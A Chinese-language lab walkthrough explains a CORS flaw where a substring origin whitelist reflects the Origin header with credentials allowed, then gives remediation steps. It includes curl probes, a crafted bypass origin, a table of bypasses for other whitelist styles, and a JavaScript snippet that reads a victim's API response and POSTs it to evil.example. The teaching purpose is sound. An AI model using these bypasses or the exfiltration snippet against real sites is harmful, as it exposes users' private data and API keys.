# 合作方接口的 CORS 配置错误

## 这一题在教什么

**CORS 的洞要看「两个头的组合」，不能只看 `Access-Control-Allow-Origin`。**

这两个头凑在一起才是"允许跨源读**带凭据**的响应"：

```http
Access-Control-Allow-Origin: <某个源>
Access-Control-Allow-Credentials: true
```

缺一个都不成立：

| 组合 | 浏览器会怎么做 |
|---|---|
| 只有 `ACAO`，没有 `ACAC` | 允许匿名跨源读。**请求不会带 Cookie**，所以读不到个人数据 |
| 只有 `ACAC`，没有匹配的 `ACAO` | 拒绝 |
| `ACAO: *` + `ACAC: true` | **浏览器直接拒绝** —— 规范明确不允许 `*` 配凭据 |
| `ACAO: <攻击者的源>` + `ACAC: true` | **通了** —— 攻击者的 JS 能带着受害者的 Cookie 读响应 |

所以这一题的根本问题不是"白名单写得松"，而是**反射 Origin + 允许凭据**这个组合。
白名单松只是让攻击者更容易凑出一个能过的 Origin。

## 漏洞在哪

`module.py`：

```python
# 一、白名单做成子串匹配 —— 没做域名边界检查
if any(allowed in origin for allowed in ALLOWED):

    # 二、把 Origin 原样反射，并且允许带凭据
    resp.headers["Access-Control-Allow-Origin"] = origin
    resp.headers["Access-Control-Allow-Credentials"] = "true"
```

`ALLOWED = ("https://partner.example",)`，而判断是 `allowed in origin` ——
只要 Origin 字符串**包含**这个子串就算合作方。

## 怎么打通

### 第一步：看清它对不同 Origin 的反应

```bash
# 攻击者的源：被拒
curl -i -H 'Origin: https://evil.example' \
     -b 'session=<你的 Cookie>' 'http://<靶场>/v/cors/credentials/api/me'

# 合法合作方：放行，而且 Origin 被反射了
curl -i -H 'Origin: https://partner.example' \
     -b 'session=<你的 Cookie>' 'http://<靶场>/v/cors/credentials/api/me'
```

第二个请求的响应里你会看到 `Access-Control-Allow-Origin: https://partner.example`
和 `Access-Control-Allow-Credentials: true`。

### 第二步：构造一个「含它、但不是它」的源

```
Origin: https://partner.example.evil.example
```

**域名是从右往左读的。** 最右边那段（`example`）才是顶级域，
再往左一段（`evil`）才是"谁拥有的"。所以：

- `partner.example.evil.example` → 属于 `evil.example`
- `partner.example` → 属于 `example`

两个字符串完全不同，但 `"https://partner.example" in "https://partner.example.evil.example"`
是 `True`。服务端照样反射 + 带上允许凭据的头。

### 第三步：真实的浏览器里会发生什么

攻击者站点 `evil.example` 上的 JS：

```js
fetch('http://<靶场>/v/cors/credentials/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(data => fetch('https://evil.example/collect', {method: 'POST', body: data}));
```

1. 浏览器带着受害者的 Cookie 发出请求
2. 服务端回 `ACAO: https://partner.example.evil.example` + `ACAC: true`
3. 浏览器一看「这个源就是我自己」→ **把响应体交给 JS**
4. JS 把读到的 API Key 和余额 POST 回攻击者服务器

> **为什么这个靶场里要改用 curl 验证**：这个靶场是单进程单源，
> 浏览器的"源"是 `协议 + 主机 + 端口`，这里所有页面都是同一个源 ——
> 构造不出真正的跨源请求。所以这一题用 curl 看响应头。
> 这也正是你手工确认 CORS 配置时该用的办法：拿几个 Origin 分别 `curl -i`，
> 看回什么头。

## 别的白名单写法，以及各自的绕过

这一题用的是子串匹配。真实代码里还有几种常见的写法，各有各的洞：

| 写法 | 绕过 |
|---|---|
| `allowed in origin`（这一题） | `https://partner.example.evil.example` |
| `origin.endswith("partner.example")` | `https://evil-partner.example`、`https://notpartner.example` |
| `origin.startswith("https://partner")` | `https://partner.evil.example` |
| `re.match(r"https://.*\.partner\.example", origin)` | 点没转义 → `https://evilXpartnerYexample` |
| 只比 host，忘了比协议 | 用 `http://` 也能过（就算合作方只有 https） |
| 把 `null` 放进白名单 | 沙箱 iframe / `data:` URL 的 Origin 就是字符串 `null` |
| 直接 `ACAO: *` + 想"反正不加凭据" | 一旦哪天加上 `ACAC`，`*` 会被浏览器拒 —— 但有人会改成"反射任意 Origin"，就退化成这一题 |

**正确做法**是**精确比对**，而且比的是解析之后的 `scheme + netloc`：

```python
from urllib.parse import urlsplit

def origin_allowed(origin):
    if not origin:
        return False
    parts = urlsplit(origin)
    if parts.scheme not in ("http", "https") or not parts.netloc:
        return False
    if parts.path or parts.query or parts.fragment:   # Origin 不该有这些
        return False
    return origin in ALLOWED          # 白名单里存完整的 "https://partner.example"
```

注意最后那行是 `origin in ALLOWED`（**整个字符串精确匹配**），
不是 `any(a in origin ...)`。

## 怎么修

**一、白名单精确匹配。** 见上。

**二、先问「真的需要 `ACAC: true` 吗」。**

如果接口返回的是公开数据，那就不要凭据 —— `ACAO: *` 就够了，
这一整类问题直接消失。

需要凭据的场景（比如"读当前登录用户的数据"）应该换个思路：
让合作方**用它们自己的服务端调用**这个接口（服务端到服务端，用 API Key 认证），
而不是让合作方的**用户浏览器**直接跨源调。这样根本不需要 CORS 凭据。

**三、别反射 Origin。**

反射 Origin 等于"谁问都答应"。如果要支持多合作方，就维护一份**精确的白名单**，
命中了就把**白名单里的那一项**（不是请求里的 Origin）写进 `ACAO`。

**四、`Vary: Origin` 别忘。**

如果响应会因为 Origin 而不同，一定要带 `Vary: Origin`，否则中间缓存可能
把 A 源的响应（带 A 的 `ACAO`）发给 B 源。漏了 `Vary` 会让缓存层变成放大器。

**五、加一层 CSRF 式的防护。**

CORS 漏洞的效果是"攻击者能读你的数据"。如果接口同时还会**改**数据，
那它还叠加了 CSRF。所以敏感操作该有的 CSRF token / `SameSite` / 二次确认
一个都不能少 —— CORS 是"允许读"这一面的问题，不是全部。

## 顺手想想

- 如果接口只做 `ACAO` 不加 `ACAC`，攻击者还能读到什么？
  （提示：哪些数据不需要登录就能看）
- 为什么 `ACAO: *` 不能和 `ACAC: true` 一起用？
  （想想：如果允许，那"任何一个网站都能带着用户凭据读"意味着什么）
- 这一题的攻击者是**在受害者的浏览器里**跑的。如果受害者从没访问过那个攻击站点，
  攻击成立吗？如果攻击站点是个"人人都上的"高流量站呢？
- `Origin: null` 什么时候会出现？为什么把它放进白名单很危险？
- 如果服务端在反向代理后面，而代理把 Origin 头改写/丢弃了，
  这一题的判定和攻击会怎么变？
